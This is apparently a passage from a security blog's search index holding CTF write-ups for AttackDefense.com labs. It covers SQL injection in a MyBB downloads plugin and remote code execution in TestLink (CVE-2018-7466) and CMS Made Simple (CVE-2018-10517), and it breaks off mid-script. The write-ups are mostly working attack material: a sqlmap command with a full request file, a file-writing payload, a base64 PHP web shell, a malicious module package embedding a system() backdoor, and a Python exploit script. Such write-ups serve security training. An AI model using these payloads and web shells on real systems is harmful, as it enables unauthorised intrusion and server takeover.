Injection specific error. ```MyBB has experienced an internal SQL error and cannot continue. SQL Error: 1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"a\"\"' at line 1Query: SELECT * FROM mybb_downloads WHERE name=\"a\"\"``` - THis can be exploited with: sqlmap -r request_file -p name --threads 5 3. Request File example: POST /downloads.php?newdownload=1 HTTP/1.1Host: localhost:8081User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://localhost:8081/downloads.php?newdownload=1Content-Type: multipart/form-data; boundary=---------------------------171894060312075061251712806160Content-Length: 1029Cookie: mybb[lastvisit]=1540744980; mybb[lastactive]=1540745020; sid=677a58d33fe23e7f2ea3841c79496fcd; loginattempts=1; mybbuser=3_waeMfSMiIRrTpPqW2uy8ZF8AMx8pyRtMCUJ6Gx0yoGRyLBsBowConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0 -----------------------------171894060312075061251712806160Content-Disposition: form-data; name=\"my_post_key\" 6cb47e578ed16aa5272c55b0cb8745b4-----------------------------171894060312075061251712806160Content-Disposition: form-data; name=\"name\" a\"-----------------------------171894060312075061251712806160Content-Disposition: form-data; name=\"shortdesc\" test-----------------------------171894060312075061251712806160Content-Disposition: form-data; name=\"description\" test-----------------------------171894060312075061251712806160Content-Disposition: form-data; name=\"image\" -----------------------------171894060312075061251712806160Content-Disposition: form-data; name=\"url\" 1-----------------------------171894060312075061251712806160Content-Disposition: form-data; name=\"numimages\" 4-----------------------------171894060312075061251712806160Content-Disposition: form-data; name=\"submit\" Publish download-----------------------------171894060312075061251712806160-- 3. Solution: There is no public available solution.Public appearances Exploit Database: https://www.exploit-db.com/exploits/45747/ Packet Storm Security: https://packetstormsecurity.com/files/149993/mybbdownloads203-sql.txt 0day.today: https://0day.today/exploit/31498 CXSecurity: https://cxsecurity.com/issue/WLB-2018100251Other references https://nitesculucian.github.io/2018/10/28/attackdefense-com-sxss-mybb-downloads-plugin/" }, { "title": "AttackDefense.com [RCE] - CVE-2018-7466 Exploit", "url": "/nitesculucian.github.io/2018/11/06/attackdefense-com-rce-cve-2018-7466-exploit/", "categories": "AttackDefense.com, ctf, writeups, CVE-2018, RCE", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-11-06 23:34:00 +0200", "snippet": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be attacked remotely. Remote Code Execution vulnerabilities ...", "content": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be attacked remotely. Remote Code Execution vulnerabilities could be triggered even by unauthenticated users.In the exercise below, the attacker is not authenticated to the web application and needs to find a remote code execution attack to execute arbitrary commands on the server.TestLink is a web based test management and test execution system. It enables quality assurance teams to create and manage their test cases as well as to organize them into test plans. These test plans allow team members to execute test cases and track test results dynamically.Testlink (&lt; v1.9.17) is vulnerable to a Remote Code Execution documented in CVE-2018-7466.The following information may be helpful in exploiting the vulnerability: Database name: app Database Admin User\t: pentester Database Admin Password: password1Objective: Your task is to find and exploit this vulnerability.Level difficulty: IntermediateCategory: Webapps CVEs &gt; Remote Code ExecutionSolutionAt first, I was provided with the following web application with an non-functional user account:If you look close enough, you can see the following error message, leaking an public available path.After checking this path http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/logs/config_check.txt I have discovered the following disclosed logs.As we can see the install directory is still available at: http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/ http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installIntro.php?type=new http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installDbInput.php http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installNewDB.phpUsing the following provided information Testlink (&lt; v1.9.17) is vulnerable to a Remote Code Execution documented in CVE-2018-7466. I decided to search for:And I found the following exploit description: https://vulners.com/exploitdb/EDB-ID:44349According to the exploit description, I decided to set up my payload as suchbox');file_put_contents($_GET[1],base64_decode($_GET[2]));//, becouse my lab dose not have internet access in order to upload a shell form an external link. Example of payload inputs:http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installNewDB.phpI created a shell.php file using the following payload: http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/config_db.inc.php?1=shell.php&amp;2=PD9waHANCiRvdXRwdXQgPSBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7DQplY2hvICI8cHJlPiRvdXRwdXQ8L3ByZT4iOw0KPz4=I executed my code using the created shell.php file as such: http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/shell.php?cmd=ls http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/shell.php?cmd=whoami%20;%20dateIf you have question about this challange, please ask them in the comment section bellow." }, { "title": "AttackDefense.com [RCE] - CVE-2018-10517 Exploit", "url": "/nitesculucian.github.io/2018/11/04/attackdefense-com-rce-cve-2018-10517-exploit/", "categories": "AttackDefense.com, ctf, writeups, CVE-2018, RCE", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-11-04 01:24:00 +0200", "snippet": "MissionAn attacker might get administrative access to a web application. However, this does not automatically mean that the web server can be compromised. In cases where a SaaS application is made ...", "content": "MissionAn attacker might get administrative access to a web application. However, this does not automatically mean that the web server can be compromised. In cases where a SaaS application is made available to users, it is routine to give each user admin access to his own instance of the web application e.g. a managed hosted Wordpress site. In such scenario, the attacker who will begin accessing the application as a managed administrative user will have to figure out how to exploit the administrative interface to get a shell on the server. In some cases, it might be possible to do privilege escalation as well.In the exercise below, the attacker has administrative access to the web application and needs to find a remote code execution attack to run arbitrary commands on the server.CMS Made Simple is a free, open source content management system to manage websites or web portals written in PHP.CMS Made Simple (2.2.7) is vulnerable to a Remote Code Execution documented in CVE-2018-10517.The following username and passwords may be used to explore the application and/or find a vulnerability which might require authenticated access: Username: pentester Password: passwordObjective: Your task is to find and exploit this vulnerability.Level difficulty: EasyCategory: Webapps CVEs &gt; Remote Code ExecutionSolutionThis challenge brings back some funny memories of the CMS application, so it was my pleasure to create a custom exploit for CVE-2018-10517.I decided to search for an exploit and to my surprise, there is only this publicly available reference.https://github.com/itodaro/cmsms_cve/blob/master/README.mdNext, I tested the provided credentials at the following page http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com/admin/login.php.According to the CVE description we have to go here in order to exploit our vulnerability. http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com/admin/moduleinterface.phpOk so let’s create our payload! First, I had to create my PHP shell so I decided to use this publicly available example.&lt;!-- Simple PHP Backdoor By DK (One-Liner Version) --&gt;&lt;!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd --&gt;&lt;?php if(isset($_REQUEST['cmd'])){ echo \"&lt;pre&gt;\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"&lt;/pre&gt;\"; die; }?&gt;I encoded the whole script to base64.PCEtLSBTaW1wbGUgUEhQIEJhY2tkb29yIEJ5IERLIChPbmUtTGluZXIgVmVyc2lvbikgLS0+DQo8IS0tIFVzYWdlOiBodHRwOi8vdGFyZ2V0LmNvbS9zaW1wbGUtYmFja2Rvb3IucGhwP2NtZD1jYXQrL2V0Yy9wYXNzd2QgLS0+DQo8P3BocCBpZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7IGVjaG8gIjxwcmU+IjsgJGNtZCA9ICgkX1JFUVVFU1RbJ2NtZCddKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pg==I have created my payload using a public available plugin (http://dev.cmsmadesimple.org/project/files/1423):&lt;module&gt; &lt;dtdversion&gt;1.3&lt;/dtdversion&gt; &lt;name&gt;Matomo&lt;/name&gt; &lt;version&gt;0.0.1&lt;/version&gt; &lt;mincmsversion&gt;2.1.5&lt;/mincmsversion&gt; &lt;help&gt;&lt;![CDATA[LS0gTWlzc2luZyBMYW5ndWFnZXN0cmluZzogaGVscCAtLQ==]]&gt;&lt;/help&gt; &lt;about&gt;&lt;![CDATA[PGJyIC8+QXV0aG9yOiBleWVkZWUtbWVkaWEgJmx0O21vcnRlbkBwb3Vsc2VuLm9yZyZndDs8YnIgLz48YnIgLz5WZXJzaW9uOiAwLjAuMTxiciAvPjxiciAvPkNoYW5nZSBIaXN0b3J5OjxiciAvPi0tIE1pc3NpbmcgTGFuZ3VhZ2VzdHJpbmc6IGNoYW5nZWxvZyAtLTxiciAvPg==]]&gt;&lt;/about&gt; &lt;description&gt;&lt;![CDATA[-- Missing Languagestring: admindescription --]]&gt;&lt;/description&gt; &lt;file&gt; &lt;filename&gt;/&lt;/filename&gt; &lt;isdir&gt;1&lt;/isdir&gt; &lt;/file&gt; &lt;file&gt; &lt;filename&gt;/action.admin_settings.php&lt;/filename&gt; &lt;isdir&gt;0&lt;/isdir&gt; &lt;data&gt;&lt;![CDATA[PCEtLSBTaW1wbGUgUEhQIEJhY2tkb29yIEJ5IERLIChPbmUtTGluZXIgVmVyc2lvbikgLS0+DQo8IS0tIFVzYWdlOiBodHRwOi8vdGFyZ2V0LmNvbS9zaW1wbGUtYmFja2Rvb3IucGhwP2NtZD1jYXQrL2V0Yy9wYXNzd2QgLS0+DQo8P3BocCBpZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7IGVjaG8gIjxwcmU+IjsgJGNtZCA9ICgkX1JFUVVFU1RbJ2NtZCddKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pg==]]&gt;&lt;/data&gt; &lt;/file&gt; &lt;file&gt; &lt;filename&gt;/action.admin_statistics.php&lt;/filename&gt; &lt;isdir&gt;0&lt;/isdir&gt; &lt;data&gt;&lt;![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQokYXBpdG9rZW4gPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJhcGl0b2tlbiIpOw0KJHNpdGVpZD0kdGhpcy0+R2V0UHJlZmVyZW5jZSgic2l0ZWlkIik7DQokbGFuZ3VhZ2U9JHRoaXMtPkdldFByZWZlcmVuY2UoImxhbmd1YWdlIiwiZW4iKTsNCg0KJGVtYmVkX2Rhc2hib2FyZCA9ICc8aWZyYW1lIHN0eWxlPSJkaXNwbGF5OmJsb2NrOyIgc3JjPSInIC4gJHRoaXMtPkdldFByZWZlcmVuY2UoImJhc2V1cmwiKQ0KICAuICcvaW5kZXgucGhwP21vZHVsZT1XaWRnZXRpemUmYWN0aW9uPWlmcmFtZSZtb2R1bGVUb1dpZGdldGl6ZT1EYXNoYm9hcmQmYWN0aW9uVG9XaWRnZXRpemU9aW5kZXgmaWRTaXRlPScgLiAkc2l0ZWlkDQogIC4gJyZ0b2tlbl9hdXRoPScgLiAkYXBpdG9rZW4NCiAgLiAnJnBlcmlvZD1tb250aCcNCiAgLiAnJmRhdGU9dG9kYXknDQogIC4gJyZsYW5ndWFnZT0nLiRsYW5ndWFnZQ0KICAuICciIGZyYW1lYm9yZGVyPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIG1hcmdpbndpZHRoPSIwIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI4MDBweCcNCiAgLiAnIj48L2lmcmFtZT4nOw0KDQoNCmVjaG8gJGVtYmVkX2Rhc2hib2FyZDsNCg0KDQoNCi8qDQplY2hvICR0aGlzLT5TdGFydFRhYkhlYWRlcnMoKTsNCg0KZWNobyAkdGhpcy0+U2V0VGFiSGVhZGVyKCJiYXNlIiwiU2lkZXIiLCgkdGFiPT0icGFnZXMiKSk7DQplY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoInNla3Rpb25lciIsIlNla3Rpb25lciIsKCR0YWI9PSJzZWN0aW9ucyIpKTsNCi8vICBlY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoImluZHN0aWxsaW5nZXIiLCJJbmRzdGlsbGluZ2VyIiwoJHRhYj09InNldHRpbmdzIikpOw0KZWNobyAkdGhpcy0+RW5kVGFiSGVhZGVycygpOw0KDQplY2hvICR0aGlzLT5TdGFydFRhYkNvbnRlbnQoKTsNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJzaWRlciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KZWNobyAkdGhpcy0+U3RhcnRUYWIoInNla3Rpb25lciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KLyoNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJ1cGxvYWQiKTsNCiAgaW5jbHVkZV9vbmNlKGRpcm5hbWUoX19maWxlX18pLiIvdGFiLmluZHN0aWxsaW5nZXIucGhwIik7DQogIGVjaG8gJHRoaXMtPkVuZFRhYigpOw0KKi8NCi8vZWNobyAkdGhpcy0+RW5kVGFiQ29udGVudCgpOw0KDQoNCg0KLyoNCiRhcGl0b2tlbiA9JHRoaXMtPkdldFByZWZlcmVuY2UoImFwaXRva2VuIik7DQokc2l0ZWlkPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJzaXRlaWQiKTsNCg0KLy8gd2UgY2FsbCB0aGUgUkVTVCBBUEkgYW5kIHJlcXVlc3QgdGhlIDEwMCBmaXJzdCBrZXl3b3JkcyBmb3IgdGhlIGxhc3QgbW9udGggZm9yIHRoZSBpZHNpdGU9Nw0KJHVybCA9ICR0aGlzLT5HZXRQcmVmZXJlbmNlKCJiYXNldXJsIik7DQokdXJsIC49ICI/bW9kdWxlPUFQSSZtZXRob2Q9UmVmZXJyZXJzLmdldEtleXdvcmRzIjsNCiR1cmwgLj0gIiZpZFNpdGU9JHNpdGVpZCZwZXJpb2Q9bW9udGgmZGF0ZT15ZXN0ZXJkYXkiOw0KJHVybCAuPSAiJmZvcm1hdD1QSFAmZmlsdGVyX2xpbWl0PTIwIjsNCiR1cmwgLj0gIiZ0b2tlbl9hdXRoPSRhcGl0b2tlbiI7DQoNCiRmZXRjaGVkID0gZmlsZV9nZXRfY29udGVudHMoJHVybCk7DQovL2VjaG8gJGZldGNoZWQ7cmV0dXJuOw0KJGNvbnRlbnQgPSB1bnNlcmlhbGl6ZSgkZmV0Y2hlZCk7DQovL3ByaW50X3IoJGNvbnRlbnQpO3JldHVybjsNCg0KLy8gY2FzZSBlcnJvcg0KaWYgKCEkY29udGVudCkgew0KICBwcmludCgiRXJyb3IgcGFyc2luZyBkYXRhLCBjb250ZW50IGZldGNoZWQgPSAiIC4gJGZldGNoZWQpOw0KICByZXR1cm47DQp9DQoNCmlmICgkY29udGVudFsicmVzdWx0Il09PSJlcnJvciIpIHsNCiAgcHJpbnQoIkVycm9yLCBtZXNzYWdlID0gIiAuICRjb250ZW50WyJtZXNzYWdlIl0pOw0KICByZXR1cm47DQp9DQoNCnByaW50KCI8aDE+S2V5d29yZHMgZm9yIHRoZSBsYXN0IG1vbnRoPC9oMT5cbiIpOw0KZm9yZWFjaCAoJGNvbnRlbnQgYXMgJHJvdykgew0KICAka2V5d29yZCA9IGh0bWxzcGVjaWFsY2hhcnMoaHRtbF9lbnRpdHlfZGVjb2RlKHVybGRlY29kZSgkcm93WydsYWJlbCddKSwgRU5UX1FVT1RFUywgJ1VURi04JyksIEVOVF9RVU9URVMsICdVVEYtOCcpOw0KICAkaGl0cyA9ICRyb3dbJ25iX3Zpc2l0cyddOw0KDQogIHByaW50KCI8Yj4ka2V5d29yZDwvYj4gKCRoaXRzIGhpdHMpPGJyPlxuIik7DQp9DQoqLw0K]]&gt;&lt;/data&gt; &lt;/file&gt; &lt;file&gt; &lt;filename&gt;/action.default.php&lt;/filename&gt; &lt;isdir&gt;0&lt;/isdir&gt; &lt;data&gt;&lt;![CDATA[PD9waHANCg0KZWNobyAkdGhpcy0+TmVvUHJvY2Vzc1RlbXBsYXRlRnJvbURhdGEoJHRoaXMtPkdldFRyYWNraW5nQ29kZSgpKTs=]]&gt;&lt;/data&gt; &lt;/file&gt; &lt;file&gt; &lt;filename&gt;/action.savesettings.php&lt;/filename&gt; &lt;isdir&gt;0&lt;/isdir&gt; &lt;data&gt;&lt;![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQppZiggISR0aGlzLT5DaGVja1Blcm1pc3Npb24oJ01vZGlmeSBTaXRlIFByZWZlcmVuY2VzJykgKSByZXR1cm47DQoNCg0KJHRoaXMtPk5lb1NhdmVWYWx1ZXMoJHBhcmFtcyxhcnJheSgNCiAgImJhc2V1cmwiLA0KICAidHJhY2tpbmdjb2RlIiwNCiAgImFwaXRva2VuIiwNCiAgInNpdGVpZCINCikpOw0KDQokdGhpcy0+UmVkaXJlY3QoJGlkLCAnYWRtaW5fc2V0dGluZ3MnLCAkcmV0dXJuaWQsYXJyYXkoInRhYiI9PiJzZXR0aW5ncyIsIm1vZHVsZV9tZXNzYWdlIj0+JHRoaXMtPkxhbmcoInNldHRpbmdzc2F2ZWQiKSkpOw0K]]&gt;&lt;/data&gt; &lt;/file&gt; &lt;file&gt; &lt;filename&gt;/lang/&lt;/filename&gt; &lt;isdir&gt;1&lt;/isdir&gt; &lt;/file&gt; &lt;file&gt; &lt;filename&gt;/lang/en_US.php&lt;/filename&gt; &lt;isdir&gt;0&lt;/isdir&gt; &lt;data&gt;&lt;![CDATA[PD9waHANCi8qKg0KICogQ3JlYXRlZCBieSBQaHBTdG9ybS4NCiAqIFVzZXI6IG1vcnRlbg0KICogRGF0ZTogMjctMDktMjAxOA0KICogVGltZTogMDg6NTMNCiAqLw0KDQoNCiRsYW5nWyJ0aXRsZV9zdGF0aXN0aWNzIl09Ik1hdG9tbyBTdGF0aXN0aWNzIjsNCiRsYW5nWyJ0aXRsZV9zZXR0aW5ncyJdPSJNYXRvbW8gU2V0dGluZ3MiOw0KDQokbGFuZ1siYmFzZXVybCJdPSJCYXNlIFVSTCI7DQokbGFuZ1siYmFzZXVybGhlbHAiXT0iVGhlIGJhc2UgdXJsIG9mIHRoZSBNYXRvbW8taW5zdGFsbGF0aW9uLiBQbGVhc2UgaW5jbHVkZSBodHRwOi8vIG9yIGh0dHBzOi8vIjsNCiRsYW5nWyJhcGl0b2tlbiJdPSJBUEkgdG9rZW4iOw0KJGxhbmdbImFwaXRva2VuaGVscCJdPSJUaGUgQVBJIHRva2VuIGZvciBhY2Nlc3NpbmcgTWF0b21vLiBDYW4gYmUgb2J0YWluZWQgYWZ0ZXIgbG9nZ2luZyBpbnRvIHRoZSBNYXRvbW8gaW5zdGFsbGF0aW9uIjsNCiRsYW5nWyJzaXRlaWQiXT0iU2l0ZSBJRCI7DQokbGFuZ1sic2l0ZWlkaGVscCJdPSJUaGUgSUQgb2YgdGhlIHNpdGUgYXMgc2VlbiBieSB0aGUgTWF0b21vIGluc3RhbGxhdGlvbiI7DQokbGFuZ1sidHJhY2tpbmdjb2RlIl09IlRyYWNraW5nIGNvZGUiOw0KJGxhbmdbInRyYWNraW5nY29kZWhlbHAiXT0iVGhlIHRyYWNraW5nIGNvZGUgZnJvbSBNYXRvbW8gKHRoaXMgd2lsbCBwcm9iYWJseSBiZSBhdXRvZ2VuZXJhdGVkIGF0IGEgbGF0ZXIgdmVyc2lvbikiOw0KJGxhbmdbInNhdmVzZXR0aW5ncyJdPSJTYXZlIHNldHRpbmdzIjsNCiRsYW5nWyJzZXR0aW5nc3NhdmVkIl09IlNldHRpbmdzIHNhdmVkIjs=]]&gt;&lt;/data&gt; &lt;/file&gt; &lt;file&gt; &lt;filename&gt;/Matomo.module.php&lt;/filename&gt; &lt;isdir&gt;0&lt;/isdir&gt; &lt;data&gt;&lt;![CDATA[]]&gt;&lt;/data&gt; &lt;/file&gt; &lt;file&gt; &lt;filename&gt;/moduleinfo.ini&lt;/filename&gt; &lt;isdir&gt;0&lt;/isdir&gt; &lt;data&gt;&lt;![CDATA[W21vZHVsZV0KbmFtZSA9ICJNYXRvbW8iCnZlcnNpb24gPSAiMC4wLjEiCmF1dGhvciA9ICJleWVkZWUtbWVkaWEiCmF1dGhvcmVtYWlsID0gIm1vcnRlbkBwb3Vsc2VuLm9yZyIKbWluY21zdmVyc2lvbiA9ICIyLjEuNSIKbGF6eWxvYWRhZG1pbiA9IDAKbGF6eWxvYWRmcm9udGVuZCA9IDAK]]&gt;&lt;/data&gt; &lt;/file&gt; &lt;file&gt; &lt;filename&gt;/templates/&lt;/filename&gt; &lt;isdir&gt;1&lt;/isdir&gt; &lt;/file&gt; &lt;file&gt; &lt;filename&gt;/templates/adminsettings.tpl&lt;/filename&gt; &lt;isdir&gt;0&lt;/isdir&gt; &lt;data&gt;&lt;![CDATA[e2Zvcm1fc3RhcnQgYWN0aW9uPSJzYXZlc2V0dGluZ3MifQ0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQxIj57JG1vZC0+bGFuZygiYmFzZXVybCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkMSIgdHlwZT0idGV4dCIgc2l6ZT0iNjQiIGxlbmd0aD0iNjQiIHZhbHVlPSJ7JG1vZC0+cHJmKCJiYXNldXJsIil9IiBuYW1lPSJ7JGFpZH1iYXNldXJsIj57JG1vZC0+bGFuZygiYmFzZXVybGhlbHAiKX0NCiAgICA8L3A+DQo8L2Rpdj4NCg0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQzIj57JG1vZC0+bGFuZygiYXBpdG9rZW4iKX06PC9sYWJlbD4geypjbXNfaGVscCBrZXk9J2hlbHBfYXJ0aWNsZV91c2VleHBpcnknIHRpdGxlPSR1c2VleHBpcmF0aW9udGV4dCp9DQogICAgPC9wPg0KICAgIDxwIGNsYXNzPSJwYWdlaW5wdXQiPg0KICAgICAgICA8aW5wdXQgaWQ9InskYWlkfWZsZDMiIHR5cGU9InRleHQiIHNpemU9IjY0IiBsZW5ndGg9IjY0IiB2YWx1ZT0ieyRtb2QtPnByZigiYXBpdG9rZW4iKX0iIG5hbWU9InskYWlkfWFwaXRva2VuIj57JG1vZC0+bGFuZygiYXBpdG9rZW5oZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkNCI+eyRtb2QtPmxhbmcoInNpdGVpZCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkNCIgdHlwZT0idGV4dCIgc2l6ZT0iOCIgbGVuZ3RoPSI4IiB2YWx1ZT0ieyRtb2QtPnByZigic2l0ZWlkIil9IiBuYW1lPSJ7JGFpZH1zaXRlaWQiPnskbW9kLT5sYW5nKCJzaXRlaWRoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkMiI+eyRtb2QtPmxhbmcoInRyYWNraW5nY29kZSIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDx0ZXh0YXJlYSBpZD0ieyRhaWR9ZmxkMiIgcm93cz0iMTIiIGNvbHM9IjQwIiBuYW1lPSJ7JGFpZH10cmFja2luZ2NvZGUiPnskbW9kLT5wcmYoInRyYWNraW5nY29kZSIpfTwvdGV4dGFyZWE+DQogICAgICAgIDxici8+DQogICAgICAgIHskbW9kLT5sYW5nKCJ0cmFja2luZ2NvZGVoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCg0KICAgIDwvcD4NCiAgICA8cCBjbGFzcz0icGFnZWlucHV0Ij4NCiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ieyRhaWR9c3VibWl0IiB2YWx1ZT0ieyRtb2QtPmxhbmcoInNhdmVzZXR0aW5ncyIpfSIvPg0KICAgIDwvcD4NCjwvZGl2Pg0KDQoNCntmb3JtX2VuZH0NCg==]]&gt;&lt;/data&gt; &lt;/file&gt;&lt;/module&gt;The exploitation process:Upload confirmation:Searching for my exploit code: http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com/modules/ http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com/modules/Matomo/action.admin_settings.php http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com/modules/Matomo/action.admin_settings.php?cmd=whoami http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com/modules/Matomo/action.admin_settings.php?cmd=ls%20-alOk, so I got a functional but manual exploit for CVE-2018-10517. I decided to create the following exploit script in python:import requests# target configuration (required admin credentials in order to obtain a valid session)target_url=\"http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com:80\"session_cookie = \"CMSSESSID2543746e82b0\"session_value = \"vsjesfmu00rkrvd6e86t8idfo1\"# upload of shell under the name of Matomo pluginburp0_url = target_url + \"/admin/moduleinterface.php\"burp0_cookies = {session_cookie: session_value}burp0_headers = {\"User-Agent\": \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com/\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------207726338310671742711263591267\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"}burp0_data=\"-----------------------------207726338310671742711263591267\\r\\nContent-Disposition: form-data; name=\\\"mact\\\"\\r\\n\\r\\nModuleManager,m1_,local_import,0\\r\\n-----------------------------207726338310671742711263591267\\r\\nContent-Disposition: form-data; name=\\\"__c\\\"\\r\\n\\r\\n9a63802b6c4579cc01c\\r\\n-----------------------------207726338310671742711263591267\\r\\nContent-Disposition: form-data; name=\\\"m1_upload\\\"; filename=\\\"test.xml\\\"\\r\\nContent-Type: text/xml\\r\\n\\r\\n&lt;module&gt;\\n &lt;dtdversion&gt;1.3&lt;/dtdversion&gt;\\n &lt;name&gt;Matomo&lt;/name&gt;\\n &lt;version&gt;0.0.1&lt;/version&gt;\\n &lt;mincmsversion&gt;2.1.5&lt;/mincmsversion&gt;\\n &lt;help&gt;&lt;![CDATA[LS0gTWlzc2luZyBMYW5ndWFnZXN0cmluZzogaGVscCAtLQ==]]&gt;&lt;/help&gt;\\n &lt;about&gt;&lt;![CDATA[PGJyIC8+QXV0aG9yOiBleWVkZWUtbWVkaWEgJmx0O21vcnRlbkBwb3Vsc2VuLm9yZyZndDs8YnIgLz48YnIgLz5WZXJzaW9uOiAwLjAuMTxiciAvPjxiciAvPkNoYW5nZSBIaXN0b3J5OjxiciAvPi0tIE1pc3NpbmcgTGFuZ3VhZ2VzdHJpbmc6IGNoYW5nZWxvZyAtLTxiciAvPg==]]&gt;&lt;/about&gt;\\n &lt;description&gt;&lt;![CDATA[-- Missing Languagestring: admindescription --]]&gt;&lt;/description&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/&lt;/filename&gt;\\n &lt;isdir&gt;1&lt;/isdir&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/action.admin_settings.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[PCEtLSBTaW1wbGUgUEhQIEJhY2tkb29yIEJ5IERLIChPbmUtTGluZXIgVmVyc2lvbikgLS0+DQo8IS0tIFVzYWdlOiBodHRwOi8vdGFyZ2V0LmNvbS9zaW1wbGUtYmFja2Rvb3IucGhwP2NtZD1jYXQrL2V0Yy9wYXNzd2QgLS0+DQo8P3BocCBpZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7IGVjaG8gIjxwcmU+IjsgJGNtZCA9ICgkX1JFUVVFU1RbJ2NtZCddKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pg==]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n 